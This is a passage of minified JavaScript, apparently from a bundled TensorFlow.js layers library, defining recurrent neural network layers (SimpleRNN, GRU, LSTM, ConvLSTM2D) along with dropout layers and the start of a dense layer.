                  , u = l[0]
                  , d = l[1]
                  , h = l[2];
                this.stateful && this.resetStates(h, o);
                const p = this.returnSequences ? d : u;
                return this.returnState ? [p].concat(h) : p
            }
            ))
        }
        getInitialState(t) {
            return M((()=>{
                let e = ge(t.shape);
                return e = ut(e, [1, 2]),
                e = Ai(e),
                Array.isArray(this.cell.stateSize) ? this.cell.stateSize.map((s=>s > 1 ? Eh(e, [1, s]) : e)) : this.cell.stateSize > 1 ? [Eh(e, [1, this.cell.stateSize])] : [e]
            }
            ))
        }
        get trainableWeights() {
            return this.trainable ? this.cell.trainableWeights : []
        }
        get nonTrainableWeights() {
            return this.trainable ? this.cell.nonTrainableWeights : this.cell.weights
        }
        setFastWeightInitDuringBuild(t) {
            super.setFastWeightInitDuringBuild(t),
            null != this.cell && this.cell.setFastWeightInitDuringBuild(t)
        }
        getConfig() {
            const t = super.getConfig()
              , e = {
                returnSequences: this.returnSequences,
                returnState: this.returnState,
                goBackwards: this.goBackwards,
                stateful: this.stateful,
                unroll: this.unroll
            };
            null != this.numConstants && (e.numConstants = this.numConstants);
            const s = this.cell.getConfig();
            return this.getClassName() === Es.className && (e.cell = {
                className: this.cell.getClassName(),
                config: s
            }),
            Object.assign(Object.assign(Object.assign({}, s), t), e)
        }
        static fromConfig(t, e, s={}) {
            const r = us(e.cell, s);
            return new t(Object.assign(e, {
                cell: r
            }))
        }
    }
    Es.className = "RNN",
    _(Es);
    class ll extends Ct {
    }
    class op extends ll {
        constructor(t) {
            super(t),
            this.DEFAULT_ACTIVATION = "tanh",
            this.DEFAULT_KERNEL_INITIALIZER = "glorotNormal",
            this.DEFAULT_RECURRENT_INITIALIZER = "orthogonal",
            this.DEFAULT_BIAS_INITIALIZER = "zeros",
            this.units = t.units,
            be(this.units, "units"),
            this.activation = Ls(null == t.activation ? this.DEFAULT_ACTIVATION : t.activation),
            this.useBias = null == t.useBias || t.useBias,
            this.kernelInitializer = Ht(t.kernelInitializer || this.DEFAULT_KERNEL_INITIALIZER),
            this.recurrentInitializer = Ht(t.recurrentInitializer || this.DEFAULT_RECURRENT_INITIALIZER),
            this.biasInitializer = Ht(t.biasInitializer || this.DEFAULT_BIAS_INITIALIZER),
            this.kernelRegularizer = _t(t.kernelRegularizer),
            this.recurrentRegularizer = _t(t.recurrentRegularizer),
            this.biasRegularizer = _t(t.biasRegularizer),
            this.kernelConstraint = he(t.kernelConstraint),
            this.recurrentConstraint = he(t.recurrentConstraint),
            this.biasConstraint = he(t.biasConstraint),
            this.dropout = nr([1, Rs([0, null == t.dropout ? 0 : t.dropout])]),
            this.recurrentDropout = nr([1, Rs([0, null == t.recurrentDropout ? 0 : t.recurrentDropout])]),
            this.dropoutFunc = t.dropoutFunc,
            this.stateSize = this.units,
            this.dropoutMask = null,
            this.recurrentDropoutMask = null
        }
        build(t) {
            t = Nt(t),
            this.kernel = this.addWeight("kernel", [t[t.length - 1], this.units], null, this.kernelInitializer, this.kernelRegularizer, !0, this.kernelConstraint),
            this.recurrentKernel = this.addWeight("recurrent_kernel", [this.units, this.units], null, this.recurrentInitializer, this.recurrentRegularizer, !0, this.recurrentConstraint),
            this.useBias ? this.bias = this.addWeight("bias", [this.units], null, this.biasInitializer, this.biasRegularizer, !0, this.biasConstraint) : this.bias = null,
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                if (2 !== t.length)
                    throw new $(`SimpleRNNCell expects 2 input Tensors, got ${t.length}.`);
                let s = t[1];
                t = t[0];
                const o = null != e.training && e.training;
                let r;
                0 < this.dropout && this.dropout < 1 && null == this.dropoutMask && (this.dropoutMask = Ds({
                    ones: ()=>fn(t),
                    rate: this.dropout,
                    training: o,
                    dropoutFunc: this.dropoutFunc
                })),
                0 < this.recurrentDropout && this.recurrentDropout < 1 && null == this.recurrentDropoutMask && (this.recurrentDropoutMask = Ds({
                    ones: ()=>fn(s),
                    rate: this.recurrentDropout,
                    training: o,
                    dropoutFunc: this.dropoutFunc
                }));
                const i = this.dropoutMask
                  , a = this.recurrentDropoutMask;
                r = _n(null != i ? E(t, i) : t, this.kernel.read()),
                null != this.bias && (r = Ln(r, this.bias.read())),
                null != a && (s = E(s, a));
                let c = Q(r, _n(s, this.recurrentKernel.read()));
                return null != this.activation && (c = this.activation.apply(c)),
                [c, c]
            }
            ))
        }
        getConfig() {
            const t = super.getConfig()
              , e = {
                units: this.units,
                activation: Gs(this.activation),
                useBias: this.useBias,
                kernelInitializer: Qt(this.kernelInitializer),
                recurrentInitializer: Qt(this.recurrentInitializer),
                biasInitializer: Qt(this.biasInitializer),
                kernelRegularizer: Vt(this.kernelRegularizer),
                recurrentRegularizer: Vt(this.recurrentRegularizer),
                biasRegularizer: Vt(this.biasRegularizer),
                activityRegularizer: Vt(this.activityRegularizer),
                kernelConstraint: de(this.kernelConstraint),
                recurrentConstraint: de(this.recurrentConstraint),
                biasConstraint: de(this.biasConstraint),
                dropout: this.dropout,
                recurrentDropout: this.recurrentDropout
            };
            return Object.assign(Object.assign({}, t), e)
        }
    }
    op.className = "SimpleRNNCell",
    _(op);
    class Ab extends Es {
        constructor(t) {
            t.cell = new op(t),
            super(t)
        }
        call(t, e) {
            return M((()=>{
                null != this.cell.dropoutMask && (vt(this.cell.dropoutMask),
                this.cell.dropoutMask = null),
                null != this.cell.recurrentDropoutMask && (vt(this.cell.recurrentDropoutMask),
                this.cell.recurrentDropoutMask = null);
                const s = null == e ? null : e.mask
                  , o = null == e ? null : e.training
                  , r = null == e ? null : e.initialState;
                return super.call(t, {
                    mask: s,
                    training: o,
                    initialState: r
                })
            }
            ))
        }
        static fromConfig(t, e) {
            return new t(e)
        }
    }
    Ab.className = "SimpleRNN",
    _(Ab);
    class rp extends ll {
        constructor(t) {
            if (super(t),
            this.DEFAULT_ACTIVATION = "tanh",
            this.DEFAULT_RECURRENT_ACTIVATION = "hardSigmoid",
            this.DEFAULT_KERNEL_INITIALIZER = "glorotNormal",
            this.DEFAULT_RECURRENT_INITIALIZER = "orthogonal",
            this.DEFAULT_BIAS_INITIALIZER = "zeros",
            t.resetAfter)
                throw new $("GRUCell does not support reset_after parameter set to true.");
            this.units = t.units,
            be(this.units, "units"),
            this.activation = Ls(void 0 === t.activation ? this.DEFAULT_ACTIVATION : t.activation),
            this.recurrentActivation = Ls(void 0 === t.recurrentActivation ? this.DEFAULT_RECURRENT_ACTIVATION : t.recurrentActivation),
            this.useBias = null == t.useBias || t.useBias,
            this.kernelInitializer = Ht(t.kernelInitializer || this.DEFAULT_KERNEL_INITIALIZER),
            this.recurrentInitializer = Ht(t.recurrentInitializer || this.DEFAULT_RECURRENT_INITIALIZER),
            this.biasInitializer = Ht(t.biasInitializer || this.DEFAULT_BIAS_INITIALIZER),
            this.kernelRegularizer = _t(t.kernelRegularizer),
            this.recurrentRegularizer = _t(t.recurrentRegularizer),
            this.biasRegularizer = _t(t.biasRegularizer),
            this.kernelConstraint = he(t.kernelConstraint),
            this.recurrentConstraint = he(t.recurrentConstraint),
            this.biasConstraint = he(t.biasConstraint),
            this.dropout = nr([1, Rs([0, null == t.dropout ? 0 : t.dropout])]),
            this.recurrentDropout = nr([1, Rs([0, null == t.recurrentDropout ? 0 : t.recurrentDropout])]),
            this.dropoutFunc = t.dropoutFunc,
            this.implementation = t.implementation,
            this.stateSize = this.units,
            this.dropoutMask = null,
            this.recurrentDropoutMask = null
        }
        build(t) {
            const e = (t = Nt(t))[t.length - 1];
            this.kernel = this.addWeight("kernel", [e, 3 * this.units], null, this.kernelInitializer, this.kernelRegularizer, !0, this.kernelConstraint),
            this.recurrentKernel = this.addWeight("recurrent_kernel", [this.units, 3 * this.units], null, this.recurrentInitializer, this.recurrentRegularizer, !0, this.recurrentConstraint),
            this.useBias ? this.bias = this.addWeight("bias", [3 * this.units], null, this.biasInitializer, this.biasRegularizer, !0, this.biasConstraint) : this.bias = null,
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                if (2 !== t.length)
                    throw new $(`GRUCell expects 2 input Tensors (inputs, h, c), got ${t.length}.`);
                const s = null != e.training && e.training;
                let o = t[1];
                t = t[0],
                0 < this.dropout && this.dropout < 1 && null == this.dropoutMask && (this.dropoutMask = Ds({
                    ones: ()=>fn(t),
                    rate: this.dropout,
                    training: s,
                    count: 3,
                    dropoutFunc: this.dropoutFunc
                })),
                0 < this.recurrentDropout && this.recurrentDropout < 1 && null == this.recurrentDropoutMask && (this.recurrentDropoutMask = Ds({
                    ones: ()=>fn(o),
                    rate: this.recurrentDropout,
                    training: s,
                    count: 3,
                    dropoutFunc: this.dropoutFunc
                }));
                const r = this.dropoutMask
                  , i = this.recurrentDropoutMask;
                let a, c, l;
                0 < this.dropout && this.dropout < 1 && (t = E(t, r[0]));
                let u = _n(t, this.kernel.read());
                this.useBias && (u = Ln(u, this.bias.read())),
                0 < this.recurrentDropout && this.recurrentDropout < 1 && (o = E(o, i[0]));
                const d = this.recurrentKernel.read()
                  , [h,p] = on(d, [2 * this.units, this.units], d.rank - 1)
                  , f = _n(o, h)
                  , [m,g,b] = on(u, 3, u.rank - 1)
                  , [x,I] = on(f, 2, f.rank - 1);
                a = this.recurrentActivation.apply(Q(m, x)),
                c = this.recurrentActivation.apply(Q(g, I));
                const y = _n(E(c, o), p);
                l = this.activation.apply(Q(b, y));
                const w = Q(E(a, o), E(Q(1, ne(a)), l));
                return [w, w]
            }
            ))
        }
        getConfig() {
            const t = super.getConfig()
              , e = {
                units: this.units,
                activation: Gs(this.activation),
                recurrentActivation: Gs(this.recurrentActivation),
                useBias: this.useBias,
                kernelInitializer: Qt(this.kernelInitializer),
                recurrentInitializer: Qt(this.recurrentInitializer),
                biasInitializer: Qt(this.biasInitializer),
                kernelRegularizer: Vt(this.kernelRegularizer),
                recurrentRegularizer: Vt(this.recurrentRegularizer),
                biasRegularizer: Vt(this.biasRegularizer),
                activityRegularizer: Vt(this.activityRegularizer),
                kernelConstraint: de(this.kernelConstraint),
                recurrentConstraint: de(this.recurrentConstraint),
                biasConstraint: de(this.biasConstraint),
                dropout: this.dropout,
                recurrentDropout: this.recurrentDropout,
                implementation: this.implementation,
                resetAfter: !1
            };
            return Object.assign(Object.assign({}, t), e)
        }
    }
    rp.className = "GRUCell",
    _(rp);
    class Pb extends Es {
        constructor(t) {
            0 === t.implementation && console.warn("`implementation=0` has been deprecated, and now defaults to `implementation=1`. Please update your layer call."),
            t.cell = new rp(t),
            super(t)
        }
        call(t, e) {
            return M((()=>{
                null != this.cell.dropoutMask && (vt(this.cell.dropoutMask),
                this.cell.dropoutMask = null),
                null != this.cell.recurrentDropoutMask && (vt(this.cell.recurrentDropoutMask),
                this.cell.recurrentDropoutMask = null);
                const s = null == e ? null : e.mask
                  , o = null == e ? null : e.training
                  , r = null == e ? null : e.initialState;
                return super.call(t, {
                    mask: s,
                    training: o,
                    initialState: r
                })
            }
            ))
        }
        static fromConfig(t, e) {
            return 0 === e.implmentation && (e.implementation = 1),
            new t(e)
        }
    }
    Pb.className = "GRU",
    _(Pb);
    class ul extends ll {
        constructor(t) {
            super(t),
            this.DEFAULT_ACTIVATION = "tanh",
            this.DEFAULT_RECURRENT_ACTIVATION = "hardSigmoid",
            this.DEFAULT_KERNEL_INITIALIZER = "glorotNormal",
            this.DEFAULT_RECURRENT_INITIALIZER = "orthogonal",
            this.DEFAULT_BIAS_INITIALIZER = "zeros",
            this.units = t.units,
            be(this.units, "units"),
            this.activation = Ls(void 0 === t.activation ? this.DEFAULT_ACTIVATION : t.activation),
            this.recurrentActivation = Ls(void 0 === t.recurrentActivation ? this.DEFAULT_RECURRENT_ACTIVATION : t.recurrentActivation),
            this.useBias = null == t.useBias || t.useBias,
            this.kernelInitializer = Ht(t.kernelInitializer || this.DEFAULT_KERNEL_INITIALIZER),
            this.recurrentInitializer = Ht(t.recurrentInitializer || this.DEFAULT_RECURRENT_INITIALIZER),
            this.biasInitializer = Ht(t.biasInitializer || this.DEFAULT_BIAS_INITIALIZER),
            this.unitForgetBias = t.unitForgetBias,
            this.kernelRegularizer = _t(t.kernelRegularizer),
            this.recurrentRegularizer = _t(t.recurrentRegularizer),
            this.biasRegularizer = _t(t.biasRegularizer),
            this.kernelConstraint = he(t.kernelConstraint),
            this.recurrentConstraint = he(t.recurrentConstraint),
            this.biasConstraint = he(t.biasConstraint),
            this.dropout = nr([1, Rs([0, null == t.dropout ? 0 : t.dropout])]),
            this.recurrentDropout = nr([1, Rs([0, null == t.recurrentDropout ? 0 : t.recurrentDropout])]),
            this.dropoutFunc = t.dropoutFunc,
            this.implementation = t.implementation,
            this.stateSize = [this.units, this.units],
            this.dropoutMask = null,
            this.recurrentDropoutMask = null
        }
        build(t) {
            var e;
            const s = (t = Nt(t))[t.length - 1];
            let o;
            if (this.kernel = this.addWeight("kernel", [s, 4 * this.units], null, this.kernelInitializer, this.kernelRegularizer, !0, this.kernelConstraint),
            this.recurrentKernel = this.addWeight("recurrent_kernel", [this.units, 4 * this.units], null, this.recurrentInitializer, this.recurrentRegularizer, !0, this.recurrentConstraint),
            this.useBias) {
                if (this.unitForgetBias) {
                    const r = this.biasInitializer
                      , i = this.units;
                    o = new ((e = class extends xn {
                        apply(c, l) {
                            const u = r.apply([i])
                              , d = (new Wh).apply([i])
                              , h = r.apply([2 * i]);
                            return g0(g0(u, d), h)
                        }
                    }
                    ).className = "CustomInit",
                    e)
                } else
                    o = this.biasInitializer;
                this.bias = this.addWeight("bias", [4 * this.units], null, o, this.biasRegularizer, !0, this.biasConstraint)
            } else
                this.bias = null;
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                const s = null != e.training && e.training;
                if (3 !== t.length)
                    throw new $(`LSTMCell expects 3 input Tensors (inputs, h, c), got ${t.length}.`);
                let o = t[1];
                const r = t[2];
                t = t[0],
                0 < this.dropout && this.dropout < 1 && null == this.dropoutMask && (this.dropoutMask = Ds({
                    ones: ()=>fn(t),
                    rate: this.dropout,
                    training: s,
                    count: 4,
                    dropoutFunc: this.dropoutFunc
                })),
                0 < this.recurrentDropout && this.recurrentDropout < 1 && null == this.recurrentDropoutMask && (this.recurrentDropoutMask = Ds({
                    ones: ()=>fn(o),
                    rate: this.recurrentDropout,
                    training: s,
                    count: 4,
                    dropoutFunc: this.dropoutFunc
                }));
                const i = this.dropoutMask
                  , a = this.recurrentDropoutMask;
                let c, l, u, d;
                0 < this.dropout && this.dropout < 1 && (t = E(t, i[0]));
                let h = _n(t, this.kernel.read());
                0 < this.recurrentDropout && this.recurrentDropout < 1 && (o = E(o, a[0])),
                h = Q(h, _n(o, this.recurrentKernel.read())),
                this.useBias && (h = Ln(h, this.bias.read()));
                const [p,f,m,g] = on(h, 4, h.rank - 1);
                c = this.recurrentActivation.apply(p),
                l = this.recurrentActivation.apply(f),
                u = Q(E(l, r), E(c, this.activation.apply(m))),
                d = this.recurrentActivation.apply(g);
                const b = E(d, this.activation.apply(u));
                return [b, b, u]
            }
            ))
        }
        getConfig() {
            const t = super.getConfig()
              , e = {
                units: this.units,
                activation: Gs(this.activation),
                recurrentActivation: Gs(this.recurrentActivation),
                useBias: this.useBias,
                kernelInitializer: Qt(this.kernelInitializer),
                recurrentInitializer: Qt(this.recurrentInitializer),
                biasInitializer: Qt(this.biasInitializer),
                unitForgetBias: this.unitForgetBias,
                kernelRegularizer: Vt(this.kernelRegularizer),
                recurrentRegularizer: Vt(this.recurrentRegularizer),
                biasRegularizer: Vt(this.biasRegularizer),
                activityRegularizer: Vt(this.activityRegularizer),
                kernelConstraint: de(this.kernelConstraint),
                recurrentConstraint: de(this.recurrentConstraint),
                biasConstraint: de(this.biasConstraint),
                dropout: this.dropout,
                recurrentDropout: this.recurrentDropout,
                implementation: this.implementation
            };
            return Object.assign(Object.assign({}, t), e)
        }
    }
    ul.className = "LSTMCell",
    _(ul);
    class Ob extends Es {
        constructor(t) {
            0 === t.implementation && console.warn("`implementation=0` has been deprecated, and now defaults to `implementation=1`. Please update your layer call."),
            t.cell = new ul(t),
            super(t)
        }
        call(t, e) {
            return M((()=>{
                null != this.cell.dropoutMask && (vt(this.cell.dropoutMask),
                this.cell.dropoutMask = null),
                null != this.cell.recurrentDropoutMask && (vt(this.cell.recurrentDropoutMask),
                this.cell.recurrentDropoutMask = null);
                const s = null == e ? null : e.mask
                  , o = null == e ? null : e.training
                  , r = null == e ? null : e.initialState;
                return super.call(t, {
                    mask: s,
                    training: o,
                    initialState: r
                })
            }
            ))
        }
        static fromConfig(t, e) {
            return 0 === e.implmentation && (e.implementation = 1),
            new t(e)
        }
    }
    Ob.className = "LSTM",
    _(Ob);
    class ip extends ll {
        constructor(t) {
            super(t),
            this.cells = t.cells
        }
        get stateSize() {
            const t = [];
            for (const e of this.cells.slice().reverse())
                Array.isArray(e.stateSize) ? t.push(...e.stateSize) : t.push(e.stateSize);
            return t
        }
        call(t, e) {
            return M((()=>{
                let s = t.slice(1);
                const o = [];
                for (const a of this.cells.slice().reverse())
                    Array.isArray(a.stateSize) ? o.push(s.splice(0, a.stateSize.length)) : o.push(s.splice(0, 1));
                o.reverse();
                const r = [];
                let i;
                for (let a = 0; a < this.cells.length; ++a) {
                    const c = this.cells[a];
                    s = o[a],
                    i = 0 === a ? [t[0]].concat(s) : [i[0]].concat(s),
                    i = c.call(i, e),
                    r.push(i.slice(1))
                }
                s = [];
                for (const a of r.slice().reverse())
                    s.push(...a);
                return [i[0]].concat(s)
            }
            ))
        }
        build(t) {
            let e;
            Ph(t) && (t = t[0]),
            this.cells.forEach(((s,o)=>{
                mo(`RNNCell_${o}`, (()=>{
                    s.build(t),
                    e = Array.isArray(s.stateSize) ? s.stateSize[0] : s.stateSize,
                    t = [t[0], e]
                }
                ))
            }
            )),
            this.built = !0
        }
        getConfig() {
            const t = super.getConfig()
              , o = {
                cells: this.cells.map((r=>({
                    className: r.getClassName(),
                    config: r.getConfig()
                })))
            };
            return Object.assign(Object.assign({}, t), o)
        }
        static fromConfig(t, e, s={}) {
            const o = [];
            for (const r of e.cells)
                o.push(us(r, s));
            return new t({
                cells: o
            })
        }
        get trainableWeights() {
            if (!this.trainable)
                return [];
            const t = [];
            for (const e of this.cells)
                t.push(...e.trainableWeights);
            return t
        }
        get nonTrainableWeights() {
            const t = [];
            for (const e of this.cells)
                t.push(...e.nonTrainableWeights);
            if (!this.trainable) {
                const e = [];
                for (const s of this.cells)
                    e.push(...s.trainableWeights);
                return e.concat(t)
            }
            return t
        }
        getWeights() {
            const t = [];
            for (const e of this.cells)
                t.push(...e.weights);
            return Oh(t)
        }
        setWeights(t) {
            const e = [];
            for (const s of this.cells) {
                const o = s.weights.length
                  , r = t.splice(o);
                for (let i = 0; i < s.weights.length; ++i)
                    e.push([s.weights[i], r[i]])
            }
            Kh(e)
        }
    }
    function Ds(n) {
        const {ones: t, rate: e, training: s=!1, count: o=1, dropoutFunc: r} = n
          , i = ()=>null != r ? r(t(), e) : x0(t(), e)
          , a = ()=>Oi(i, t, s);
        return !o || o <= 1 ? en(a().clone()) : Array(o).fill(void 0).map(a).map((l=>en(l.clone())))
    }
    ip.className = "StackedRNNCells",
    _(ip);
    class Kb extends Es {
        constructor(t) {
            if (t.unroll)
                throw new bt("Unrolling is not possible with convolutional RNNs.");
            if (Array.isArray(t.cell))
                throw new bt("It is not possible at the moment to stack convolutional cells.");
            super(t),
            this.inputSpec = [new ue({
                ndim: 5
            })]
        }
        call(t, e) {
            return M((()=>{
                if (null != this.cell.dropoutMask && (vt(this.cell.dropoutMask),
                this.cell.dropoutMask = null),
                null != this.cell.recurrentDropoutMask && (vt(this.cell.recurrentDropoutMask),
                this.cell.recurrentDropoutMask = null),
                e && e.constants)
                    throw new $("ConvRNN2D cell does not support constants");
                const s = null == e ? null : e.mask
                  , o = null == e ? null : e.training
                  , r = null == e ? null : e.initialState;
                return super.call(t, {
                    mask: s,
                    training: o,
                    initialState: r
                })
            }
            ))
        }
        computeOutputShape(t) {
            let e = this.computeSingleOutputShape(t);
            return this.returnSequences || (e = [e[0], ...e.slice(2)]),
            this.returnState && (e = [e, ...Array(2).fill([t[0], ...e.slice(-3)])]),
            e
        }
        getInitialState(t) {
            return M((()=>{
                const {stateSize: e} = this.cell
                  , s = t.shape
                  , o = this.computeSingleOutputShape(s)
                  , i = ge([o[0], ...o.slice(2)]);
                return Array.isArray(e) ? Array(e.length).fill(i) : [i]
            }
            ))
        }
        resetStates(t, e=!1) {
            M((()=>{
                if (!this.stateful)
                    throw new Zn("Cannot call resetStates() on an RNN Layer that is not stateful.");
                const s = this.inputSpec[0].shape
                  , o = this.computeSingleOutputShape(s)
                  , r = [o[0], ...o.slice(2)];
                if (null == s[0])
                    throw new $("If an RNN is stateful, it needs to know its batch size. Specify the batch size of your input tensors: \n- If using a Sequential model, specify the batch size by passing a `batchInputShape` option to your first layer.\n- If using the functional API, specify the batch size by passing a `batchShape` option to your Input layer.");
                if (null == this.getStates())
                    Array.isArray(this.cell.stateSize) ? this.states_ = this.cell.stateSize.map((()=>ge(r))) : this.states_ = [ge(r)];
                else if (null == t)
                    vt(this.states_),
                    null != this.keptStates && (vt(this.keptStates),
                    this.keptStates = []),
                    Array.isArray(this.cell.stateSize) ? this.states_ = this.cell.stateSize.map((()=>ge(r))) : this.states_[0] = ge(r);
                else {
                    if (Array.isArray(t) || (t = [t]),
                    t.length !== this.states_.length)
                        throw new $(`Layer ${this.name} expects ${this.states_.length} state(s), but it received ${t.length} state value(s). Input received: ${t}`);
                    e ? this.keptStates.push(this.states_.slice()) : vt(this.states_);
                    for (let a = 0; a < this.states_.length; ++a) {
                        const c = t[a]
                          , l = r;
                        if (!Rt(c.shape, l))
                            throw new $(`State ${a} is incompatible with layer ${this.name}: expected shape=${l}, received shape=${c.shape}`);
                        this.states_[a] = c
                    }
                }
                this.states_ = this.states_.map((a=>en(a.clone())))
            }
            ))
        }
        computeSingleOutputShape(t) {
            const {dataFormat: e, filters: s, kernelSize: o, padding: r, strides: i, dilationRate: a} = this.cell
              , c = "channelsFirst" === e
              , l = t[c ? 3 : 2]
              , u = t[c ? 4 : 3]
              , d = Wn(l, o[0], r, i[0], a[0])
              , h = Wn(u, o[1], r, i[1], a[1]);
            return [...t.slice(0, 2), ...c ? [s, d, h] : [d, h, s]]
        }
    }
    Kb.className = "ConvRNN2D";
    class ap extends ul {
        constructor(t) {
            const {filters: e, kernelSize: s, strides: o, padding: r, dataFormat: i, dilationRate: a} = t;
            super(Object.assign(Object.assign({}, t), {
                units: e
            })),
            this.filters = e,
            be(this.filters, "filters"),
            this.kernelSize = or(s, 2, "kernelSize"),
            this.kernelSize.forEach((c=>be(c, "kernelSize"))),
            this.strides = or(o || 1, 2, "strides"),
            this.strides.forEach((c=>be(c, "strides"))),
            this.padding = r || "valid",
            rn(this.padding),
            this.dataFormat = i || "channelsLast",
            se(this.dataFormat),
            this.dilationRate = or(a || 1, 2, "dilationRate"),
            this.dilationRate.forEach((c=>be(c, "dilationRate")))
        }
        build(t) {
            var e;
            t = Nt(t);
            const s = "channelsFirst" === this.dataFormat ? 1 : t.length - 1;
            if (null == t[s])
                throw new $(`The channel dimension of the input should be defined. Found ${t[s]}`);
            const o = t[s]
              , i = this.kernelSize.concat([o, 4 * this.filters]);
            this.kernel = this.addWeight("kernel", i, null, this.kernelInitializer, this.kernelRegularizer, !0, this.kernelConstraint);
            const a = this.kernelSize.concat([this.filters, 4 * this.filters]);
            if (this.recurrentKernel = this.addWeight("recurrent_kernel", a, null, this.recurrentInitializer, this.recurrentRegularizer, !0, this.recurrentConstraint),
            this.useBias) {
                let c;
                if (this.unitForgetBias) {
                    const l = this.biasInitializer
                      , u = this.filters;
                    c = new ((e = class extends xn {
                        apply(h, p) {
                            return Lh([l.apply([u]), Ss([u]), l.apply([2 * u])])
                        }
                    }
                    ).className = "CustomInit",
                    e)
                } else
                    c = this.biasInitializer;
                this.bias = this.addWeight("bias", [4 * this.filters], null, c, this.biasRegularizer, !0, this.biasConstraint)
            }
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                if (3 !== t.length)
                    throw new $(`ConvLSTM2DCell expects 3 input Tensors (inputs, h, c), got ${t.length}.`);
                const s = e.training || !1
                  , o = t[0]
                  , r = t[1]
                  , i = t[2];
                0 < this.dropout && this.dropout < 1 && null == this.dropoutMask && (this.dropoutMask = Ds({
                    ones: ()=>fn(o),
                    rate: this.dropout,
                    training: s,
                    count: 4,
                    dropoutFunc: this.dropoutFunc
                }));
                const c = this.dropoutMask
                  , l = (U,Y,j)=>Y && Y[j] ? E(Y[j], U) : U;
                let u = l(o, c, 0)
                  , d = l(o, c, 1)
                  , h = l(o, c, 2)
                  , p = l(o, c, 3);
                0 < this.recurrentDropout && this.recurrentDropout < 1 && null == this.recurrentDropoutMask && (this.recurrentDropoutMask = Ds({
                    ones: ()=>fn(r),
                    rate: this.recurrentDropout,
                    training: s,
                    count: 4,
                    dropoutFunc: this.dropoutFunc
                }));
                const f = this.recurrentDropoutMask;
                let m = l(r, f, 0)
                  , g = l(r, f, 1)
                  , b = l(r, f, 2)
                  , x = l(r, f, 3);
                const [y,w,C,k] = on(this.kernel.read(), 4, 3)
                  , [S,T,R,L] = this.useBias ? on(this.bias.read(), 4) : [null, null, null, null];
                u = this.inputConv(u, y, S, this.padding),
                d = this.inputConv(d, w, T, this.padding),
                h = this.inputConv(h, C, R, this.padding),
                p = this.inputConv(p, k, L, this.padding);
                const [V,F,X,A] = on(this.recurrentKernel.read(), 4, 3);
                m = this.recurrentConv(m, V),
                g = this.recurrentConv(g, F),
                b = this.recurrentConv(b, X),
                x = this.recurrentConv(x, A);
                const P = this.recurrentActivation.apply(Q(u, m))
                  , B = this.recurrentActivation.apply(Q(d, g))
                  , K = Q(E(B, i), E(P, this.activation.apply(Q(h, b))))
                  , H = E(this.recurrentActivation.apply(Q(p, x)), this.activation.apply(K));
                return [H, H, K]
            }
            ))
        }
        getConfig() {
            const e = function(n, t) {
                var e = {};
                for (var s in n)
                    Object.prototype.hasOwnProperty.call(n, s) && t.indexOf(s) < 0 && (e[s] = n[s]);
                if (null != n && "function" == typeof Object.getOwnPropertySymbols) {
                    var o = 0;
                    for (s = Object.getOwnPropertySymbols(n); o < s.length; o++)
                        t.indexOf(s[o]) < 0 && Object.prototype.propertyIsEnumerable.call(n, s[o]) && (e[s[o]] = n[s[o]])
                }
                return e
            }(super.getConfig(), ["units"])
              , s = {
                filters: this.filters,
                kernelSize: this.kernelSize,
                padding: this.padding,
                dataFormat: this.dataFormat,
                dilationRate: this.dilationRate,
                strides: this.strides
            };
            return Object.assign(Object.assign({}, e), s)
        }
        inputConv(t, e, s, o) {
            const r = so(t, e, this.strides, o || "valid", "channelsFirst" === this.dataFormat ? "NCHW" : "NHWC", this.dilationRate);
            return s ? Ln(r, s, this.dataFormat) : r
        }
        recurrentConv(t, e) {
            return so(t, e, 1, "same", "channelsFirst" === this.dataFormat ? "NCHW" : "NHWC")
        }
    }
    ap.className = "ConvLSTM2DCell",
    _(ap);
    class Zb extends Kb {
        constructor(t) {
            const e = new ap(t);
            super(Object.assign(Object.assign({}, t), {
                cell: e
            }))
        }
        static fromConfig(t, e) {
            return new t(e)
        }
    }
    Zb.className = "ConvLSTM2D",
    _(Zb);
    class cp extends Ct {
        constructor(t) {
            super(t),
            this.rate = Math.max(Math.min(t.rate, 1), 0),
            this.noiseShape = t.noiseShape,
            this.seed = t.seed,
            this.supportsMasking = !0
        }
        getNoiseShape(t) {
            if (null == this.noiseShape)
                return this.noiseShape;
            const e = t.shape
              , s = [];
            for (let o = 0; o < this.noiseShape.length; ++o)
                s.push(null == this.noiseShape[o] ? e[o] : this.noiseShape[o]);
            return s
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                const s = mt(t);
                if (0 < this.rate && this.rate < 1) {
                    const o = null != e.training && e.training
                      , r = this.getNoiseShape(s);
                    return Oi((()=>x0(s, this.rate, r, this.seed)), (()=>s), o)
                }
                return t
            }
            ))
        }
        getConfig() {
            const t = {
                rate: this.rate,
                noiseShape: this.noiseShape,
                seed: this.seed
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        dispose() {
            return super.dispose()
        }
    }
    cp.className = "Dropout",
    _(cp);
    class Bb extends cp {
        constructor(t) {
            super(t),
            this.inputSpec = [{
                ndim: 3
            }]
        }
        getNoiseShape(t) {
            const e = t.shape;
            return [e[0], 1, e[2]]
        }
    }
    Bb.className = "SpatialDropout1D",
    _(Bb);
    class Hb extends Ct {
        constructor(t) {
            if (super(t),
            this.activation = null,
            this.useBias = !0,
            this.kernel = null,
            this.bias = null,
            this.DEFAULT_KERNEL_INITIALIZER = "glorotNormal",
            this.DEFAULT_BIAS_INITIALIZER = "zeros",
            null == t.batchInputShape && null == t.inputShape && null != t.inputDim) {
                let e = null;
                null != t.batchSize && (e = t.batchSize),
                this.batchInputShape = [e, t.inputDim]
            }
            this.units = t.units,
            be(this.units, "units"),
            this.activation = Ls(t.activation),
            null != t.useBias && (this.useBias = t.useBias),
            this.kernelInitializer = Ht(t.kernelInitializer || this.DEFAULT_KERNEL_INITIALIZER),
            this.biasInitializer = Ht(t.biasInitializer || this.DEFAULT_BIAS_INITIALIZER),
            this.kernelConstraint = he(t.kernelConstraint),
            this.biasConstraint = he(t.biasConstraint),
            this.kernelRegularizer = _t(t.kernelRegularizer),
            this.biasRegularizer = _t(t.biasRegularizer),
            this.activityRegularizer = _t(t.activityRegularizer),
            this.supportsMasking = !0,
            this.inputSpec = [{
                minNDim: 2
            }]
        }
        build(t) {
            const e = (t = Nt(t))[t.length - 1];
            null == this.kernel && (this.kernel = this.addWeight("kernel", [e, this.units], null, this.kernelInitializer, this.kernelRegularizer, !0, this.kernelConstraint),
